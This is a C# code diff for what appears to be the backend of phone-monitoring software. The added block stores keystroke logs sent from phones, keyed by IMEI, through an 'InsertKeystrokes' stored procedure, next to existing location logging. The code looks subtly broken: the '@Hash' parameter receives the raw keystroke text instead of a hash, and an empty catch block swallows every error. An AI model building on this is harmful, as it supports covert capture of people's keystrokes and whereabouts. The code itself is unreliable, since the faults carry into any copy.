@@ -426,6 +426,57 @@ namespace DataLayer
 
             if (AuthenticatePhone(connectionString, bulkData.Authentication))
             {
+                if (DataChecker.CheckKeylogger(bulkData.Keylogger))
+                {
+                    using (SqlCommand command = new SqlCommand("InsertKeystrokes"))
+                    {
+                        using (SqlConnection connection = new SqlConnection(connectionString))
+                        {
+                            try
+                            {
+                                connection.Open();
+                                command.Connection = connection;
+                                command.CommandType = CommandType.StoredProcedure;
+                                SqlParameter parameter = new SqlParameter()
+                                {
+                                    ParameterName = "@IMEI",
+                                    Value = bulkData.Authentication.IMEI,
+                                    SqlDbType = SqlDbType.NVarChar,
+                                    Direction = ParameterDirection.Input
+                                };
+                                command.Parameters.Add(parameter);
+
+                                parameter = new SqlParameter()
+                                {
+                                    ParameterName = "@Info",
+                                    Value = bulkData.Keylogger,
+                                    SqlDbType = SqlDbType.NText,
+                                    Direction = ParameterDirection.Input
+                                };
+                                command.Parameters.Add(parameter);
+
+                                parameter = new SqlParameter()
+                                {
+                                    ParameterName = "@Hash",
+                                    Value = bulkData.Keylogger,
+                                    SqlDbType = SqlDbType.NText,
+                                    Direction = ParameterDirection.Input
+                                };
+                                command.Parameters.Add(parameter);
+
+                                command.ExecuteNonQuery();
+                            }
+                            catch (Exception ex)
+                            {
+
+                            }
+                            finally
+                            {
+                                connection.Close();
+                            }
+                        }
+                    }
+                }
                 if (DataChecker.CheckLocation(bulkData.Location))
                 {
                     using (SqlCommand command = new SqlCommand("InsertLocation"))
